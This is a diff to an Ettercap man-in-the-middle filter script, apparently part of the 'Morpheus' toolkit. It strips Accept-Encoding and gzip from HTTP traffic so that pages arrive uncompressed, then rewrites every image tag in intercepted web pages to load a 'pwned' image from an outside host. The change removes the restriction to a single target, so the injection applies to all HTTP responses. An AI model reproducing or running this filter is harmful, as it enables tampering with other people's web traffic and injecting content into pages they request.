@@ -11,8 +11,8 @@
 ############################################################################
 
 ##
-#  This filter will substitute the html tag '<title>'
-#  and injects your image in any webpage requested.
+#  This filter will substitute the html tag '<img src=>'
+#  and injects your image in any webpage requested by TaRONE
 ##
 
 
@@ -21,15 +21,17 @@
 ##########################
 ## Zap Content Encoding ##
 ##########################
+# change target request to server
 if (ip.proto == TCP && tcp.dst == 80) {  
-   if (search(DATA.data, "Accept-Encoding")) {  
+  if (search(DATA.data, "Accept-Encoding")) {  
     replace("Accept-Encoding", "Accept-Rubbish!");   
-      # note: replacement string is same length as original string  
-      msg("[Morpheus] Status: Encoding zapped.");  
+      # note: replacement string is same length as original string
+      msg("[morpheus] host:TaRONE   [ ⊶ ]");
+      msg("[Morpheus] | Status: Encoding zapped from response ✔");  
    }  
    if (search(DATA.data, "gzip")) {  
     replace("gzip", "  ");  
-    msg("[Morpheus] |  info : whited out gzip!");
+    msg("[Morpheus] |  info : gzip zapped from response ✔");
     msg("[Morpheus] |_ info : Image injected and forward to target ✔\n"); 
    }  
 }
@@ -38,12 +40,9 @@ if (ip.proto == TCP && tcp.dst == 80) {
 #####################
 ## Replace Content ##
 #####################
-# http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg
-# https://dl.dropboxusercontent.com/u/21426454/DLL%20Injection-Functions.png
-# https://dl.dropboxusercontent.com/u/21426454/pwned_DH.jpg
-
- if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 80) {
-   replace("img src=", "img src=\"https://dl.dropboxusercontent.com/u/21426454/DLL%20Injection-Functions.png\" ");  
-   replace("IMG SRC=", "img src=\"https://dl.dropboxusercontent.com/u/21426454/DLL%20Injection-Functions.png\" ");   
- } 
+# change server response to target
+if (ip.proto == TCP && tcp.src == 80) {
+  replace("img src=", "img src=\"http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg\" ");  
+  replace("IMG SRC=", "img src=\"http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg\" ");   
+} 
 
